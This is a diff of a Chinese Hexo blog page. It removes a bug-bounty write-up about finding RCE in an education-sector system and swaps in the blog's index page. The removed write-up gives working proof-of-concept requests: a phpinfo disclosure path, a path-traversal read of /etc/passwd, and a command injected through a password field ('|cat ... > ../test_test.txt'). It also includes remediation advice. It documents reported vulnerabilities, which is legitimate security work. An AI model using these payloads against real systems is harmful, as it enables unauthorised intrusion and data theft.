@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——记第一次eudsrc拿到RCE(下) | Hexo</title>
+  <title>我的技术与生活——小站首页 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——记第一次eudsrc拿到RCE(下)`
+    document.title = `我的技术与生活——小站首页`
   </script>
 <meta name="generator" content="Hexo 7.1.1"></head>
 
@@ -344,166 +344,115 @@
     </div>
   </div>
 </div></div>
-      <div id="main-container" class="main-container">
-
-
-  <link rel="stylesheet" href="/css/partial/article.css" />
-
-<div class="article-container">
-  <div class="article">
-    <h1 class="article-title">记第一次eudsrc拿到RCE(下)</h1>
-    <div class="article-info">
-      <div class="article-info--item">
-        <div class="article-info--info">
-          
-          <div class="article-info--categories">
-            <span>分类：</span>
-            <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%97%86RCE/">渗透测试◆RCE</a>, <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%97%86%E5%AE%9E%E6%88%98%E5%88%86%E4%BA%AB/">渗透测试◆实战分享</a>
-          </div>
-          
-          
-          <div class="article-info--tags">
-            <span>标签：</span>
-            <a class="tag-link" href="/tags/edusrc/" rel="tag">edusrc</a>
-          </div>
-          
-          <p class="article-info--date">日期：2024-04-06 22:02:11</p>
-        </div>
-        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
-      </div>
-    </div>
-    <article class="article-content markdown-body">
-      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​                                                                                   <strong>免责声明</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以下漏洞均已经上报漏洞平台。请勿利用文章内的相关技术从事非法测试。若因此产生一切后果与本博客及本人无关。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仅接上一篇文章,本来都准备结束了,结果搜索文库,发现文库中还有这个系统没有进行测试的漏洞,既然RCE都有,那其他的会不会有呢,抱着试试的心态进行尝试,成功拿到第二个RCE.</span><br></pre></td></tr></table></figure>
+      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/index.css" />
 
 
 
-<h2 id="挖洞公式"><a href="#挖洞公式" class="headerlink" title="挖洞公式"></a>挖洞公式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运气+长期积累+感想敢做+耐心+细心</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><h3 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞通常由于不当的信息处理和传输造成，比如在错误消息、日志文件或者网页源代码中暴露敏感数据。这些数据可能包括软件版本信息、配置文件内容、用户个人信息等。利用这些信息，攻击者可以对系统进行更有针对性的攻击。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a><strong>任意文件读取漏洞</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞允许未经授权的用户读取服务器上的任意文件，通常是由于应用程序在处理文件读取请求时没有正确的验证用户输入。通过这种漏洞，攻击者可以获取任意包含敏感信息的文档、配置文件或者其他不应公开的数据。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="远程命令执行（RCE）漏洞"><a href="#远程命令执行（RCE）漏洞" class="headerlink" title="远程命令执行（RCE）漏洞"></a><strong>远程命令执行（RCE）漏洞</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RCE漏洞是最危险的漏洞之一，它允许攻击者在没有任何身份验证的情况下远程执行代码或命令。产生RCE的原因通常是由于应用程序使用了不安全的编程实践，比如使用eval()函数执行用户输入的字符串作为代码，或者通过调system()、exec()等函数执行由用户控制的命令。</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>​                 还是这个页面,惊喜不,没想到前台还是会存在漏洞,本次就从存在常见的未授权,开始测试</p>
-<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404052255916.png"></p>
-<h2 id="漏洞点1"><a href="#漏洞点1" class="headerlink" title="漏洞点1"></a>漏洞点1</h2><p>  前台存在phpinfo.view.php页面存在<strong>信息泄露漏洞</strong>直接在url后进行拼接:</p>
-<p>poc:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tool/view/phpinfo.view.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404062228934.png"></p>
-<p>​                通过使用<strong>前台CLI命令执行漏洞</strong>获得的管理员密码进行登录 admin&#x2F;xxxxxxxxxx 进入后台</p>
-<h2 id="漏洞点2"><a href="#漏洞点2" class="headerlink" title="漏洞点2"></a><strong>漏洞点2</strong></h2><p>  后台download.php页面存在<strong>任意文件读取漏洞</strong>,在url后直接拼接poc</p>
-<p>poc:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download.php?a=read_txt&amp;file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404062233702.png"></p>
-<h2 id="漏洞点3"><a href="#漏洞点3" class="headerlink" title="漏洞点3"></a>漏洞点3</h2><p>  后台branch_passw.php页面存在<strong>远程命令执行漏洞(RCE)</strong>,这里执行远程命令读取密码文件,写入到test_test.txt</p>
-<p>poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /itbox_pi/branch_passw.php?a=set HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Go-http-client/1.1</span><br><span class="line">Content-Length: 41</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: RUIJIEID=    xxxxxxxx            ;user=admin;</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">pass=|cat /etc/psswd&gt;../test_test.txt</span><br></pre></td></tr></table></figure>
-
-<p>  在url后直接拼接&#x2F;test_test.txt进行访问,存在文件并且返回信息,说明RCE执行成功</p>
-<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404062233889.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针对前台存在的phpinfo.view.php信息泄露漏洞，建议删除或限制访问该文件，以防止敏感信息泄露。对于后台download.php的任意文件读取漏洞，建议对用户输入进行严格的验证和过滤，确保只允许访问合法文件，并限制可下载的文件类型。针对branch_passw.php页面的远程命令执行(RCE)漏洞，建议对用户输入进行严格的验证和过滤，避免使用不安全的函数，如eval()和exec()，并确保使用最新的安全补丁和配置。同时，可以考虑使用安全编程实践，如参数化查询和预编译语句，以降低安全风险。</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对一个系统进行渗透过程中需要多查看现有页面的title,技术支持和属性的ico,和特殊的文件名(js)等,当然这些也是通过多看文章和思考长期积累而来的,需要坚持，耐心，细心，这次我就是灵光一闪想到了，这个系统就被拿下了,说不定你也能在无意之间碰到呢。</span><br></pre></td></tr></table></figure>
-
-
-    </article>
+<div class="index">
+  <div class="index-left">
     
-    <div class="read-nums">
-      <!-- id 将作为查询条件 -->
-      <span id="2024/04/06/记第一次eudsrc拿到RCE-下/" class="leancloud_visitors" data-flag-title="Your Article Title">
-        <em class="post-meta-item-text">浏览量</em>
-        <i class="leancloud-visitors-count"></i>
-      </span>
-    </div>
-    <div class="comments-intro">
-      <h2>评论区</h2>
-      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
-    </div>
-    <div id="vcomments" class="vcomments"></div>
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="某音矩阵云混剪系统V2.3.0代码审计(1)" />
+        </div>
+        <div class="index-article--content">
+          <a href="/2024/04/25/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/">某音矩阵云混剪系统V2.3.0代码审计(1) </a>
+          <div>
+            
+              <p>
+                <a class="post-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/">代码审计实战</a>
+              </p>
+            
+            
+              <p>
+                <a class="-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+              </p>
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
     
   </div>
-  <div class="article-catelogue">
-    <div class="article-catelogue--wrapper">
-      <div class="catelogue catelogue-1">
-        <h3>目录</h3>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E5%85%AC%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">挖洞公式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息泄露漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.</span> <span class="toc-text">任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.3.</span> <span class="toc-text">远程命令执行（RCE）漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">2.</span> <span class="toc-text">漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B91"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞点1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B92"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞点2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B93"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞点3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
-      </div>
-      
-        <div class="catelogue catelogue-2">
-          
-            <p>
-              <span>上一篇：</span>
-              <a href="/2024/04/07/小白如何挖到自己的第一个漏洞/">小白如何挖到自己的第一个漏洞</a>
-            </p>
-           
-          
-            <p>
-              <span>下一篇</span>
-              <a href="/2024/04/05/记第一次edusrc拿到RCE-上/">记第一次eudsrc拿到RCE(上)</a>
-            </p>
-          
-        </div>
-      
+  <div class="index-center">
+    
+  </div>
+  <div class="index-right">
+    <div class="index-right-wrapper">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/">代码审计实战</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%97%86RCE/">渗透测试◆RCE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%97%86%E5%AE%9E%E6%88%98%E5%88%86%E4%BA%AB/">渗透测试◆实战分享</a></li></ul>
+      <ul class="tags" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" rel="tag">渗透学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/" rel="tag">小程序渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/edusrc/" rel="tag">edusrc</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">2024年04月</a><span class="archive-list-count">9</span></li></ul>
     </div>
   </div>
 </div>
 
 
 <script>
-  // var定义，避免pjax重新进来造成的重复声明错误
-  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
-  new Valine({
-    el: '#vcomments',
-    appId: config.appId,
-    appKey: config.appKey,
-    placeholder: config.placeholder,
-    meta: config.meta,
-    recordIP: config.recordIP,
-    visitor: config.visitor,
-    enableQQ: config.enableQQ,
-    path: '2024/04/06/记第一次eudsrc拿到RCE-下/'
-  })
-</script>
+  var allImgBoxs = document.querySelectorAll('.index-article--box');
+  var windowHeight = window.innerHeight;
+  var boxs = Array.from(allImgBoxs);
+  var timer = null;
+  boxs.forEach((box, idx) => {
+    if (!window.loadImageSet || !window.loadImageSet.includes(idx)) {
+      box.classList.add('img-loading');
+    } else {
+      const imgDom = box.querySelector('img');
+      imgDom.src = imgDom.dataset.cover;
+    }
+  });
 
+  function scrollFn() {
+    if (timer) {
+      return;
+    }
+    timer = setTimeout(() => {
+      loadImage();
+      timer = null;
+    }, 100)
+  }
 
-<script>
-  $(document).on('pjax:complete', function() {
-    const tocs = document.querySelector('.toc')
-    const links = tocs ? tocs.querySelectorAll('a') : []
-    links.forEach(link => {
-      link.addEventListener('click', e => {
-        const href = decodeURIComponent(e.href)
-        href.search(/#(.*)/)
-        const id = RegExp.$1
-        const target = document.querySelector('#' + id)
-        const top = target.offsetTop
-        document.documentElement.scrollTo({
-          top: top - 100,
-          behavior: 'smooth'
-        })
-        e.preventDefault()
-      })
-    })
-  })
-</script> 
+  setTimeout(() => {
+    loadImage();
+  }, 100);
+  if (!window.loadedImage) {
+    document.addEventListener('scroll', scrollFn);
+  }
 
-</div>
+  function loadImage() {
+    const doc = document.documentElement;
+    const scrollTop = doc.scrollTop;
+    if (boxs.every(box => box.loadedImage)) {
+      document.removeEventListener('scroll', scrollFn);
+      window.loadedImage = 1;
+      return;
+    }
+    boxs.forEach((box, idx) => {
+      if (box.loadedImage) {
+        return;
+      }
+      if (box.getBoundingClientRect().top < windowHeight) {
+        const imgDom = box.querySelector('img');
+        imgDom.src = imgDom.dataset.cover;
+        // 图片成功加载
+        imgDom.onload = () => {
+          box.classList.remove('img-loading');
+          box.loadedImage = true;
+          if (!window.loadImageSet) {
+            window.loadImageSet = [];
+          }
+          window.loadImageSet.push(idx);
+        }
+        // 图片加载失败
+        imgDom.onerror = () => {
+          box.classList.remove('img-loading');
+          box.classList.add('img-error');
+          imgDom.src = '/imgs/404.png';
+        }
+      }
+    });
+  }
+</script> </div>
       <div class="main-right-wrapper"><div class="main-right">
   <div class="main-right--board">
     <div class="main-right--title">
